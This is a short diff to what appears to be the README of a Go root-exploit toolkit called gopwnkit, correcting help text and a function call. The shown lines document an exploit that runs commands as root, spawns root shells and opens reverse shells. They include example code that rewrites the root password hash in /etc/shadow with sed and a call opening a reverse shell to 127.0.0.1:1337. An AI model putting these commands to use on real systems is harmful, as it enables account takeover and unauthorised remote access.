@@ -33,7 +33,7 @@ $> ./exploit -h
 Usage of ./exploit:
   -c string
         Run command as root in separate process
-  -o    Pipe output of fork command to terminal
+  -o    Pipe output of forked command to terminal
   -r string
         Open a reverse-shell in separate process. Format: ip:port
   -s    Spawn a root shell
@@ -70,7 +70,7 @@ import (
 
 func main() {
     // Change root password to 'password'
-    gopwnkit.Command(`sed -i -e 's,^root:[^:]\+:,root:$6$eymNRCK.KxwDM6vu$idH0swGW1nsnLb8fT1QibUho5xg7uGJT7fuiheLZHIi9M4gTSk0qIOlUIk2Mm9/Nz5C.T4GkgkmLcK5BtOPkS0:,' etc/shadow`)
+    gopwnkit.Command(`sed -i -e 's,^root:[^:]\+:,root:$6$eymNRCK.KxwDM6vu$idH0swGW1nsnLb8fT1QibUho5xg7uGJT7fuiheLZHIi9M4gTSk0qIOlUIk2Mm9/Nz5C.T4GkgkmLcK5BtOPkS0:,' etc/shadow`, false)
 
     // Open a reverse-shell
     gopwnkit.RevShell("127.0.0.1:1337")
